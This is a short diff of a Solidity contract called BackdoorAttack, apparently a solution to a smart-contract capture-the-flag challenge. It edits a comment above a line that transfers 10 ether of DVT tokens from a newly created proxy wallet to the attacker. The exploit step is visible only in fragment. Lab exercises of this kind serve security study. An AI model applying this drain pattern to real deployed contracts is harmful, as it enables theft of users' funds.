@@ -55,7 +55,7 @@ contract BackdoorAttack {
 				IProxyCreationCallback(registry) //  callback => Function that will be called after the new proxy contract has been deployed and initialized.
 			);
 
-			//Transfer to caller
+			//Transfer to caller/attacker
 			dvt.transferFrom(address(_newProxy), msg.sender, 10 ether);
 		}
 	}
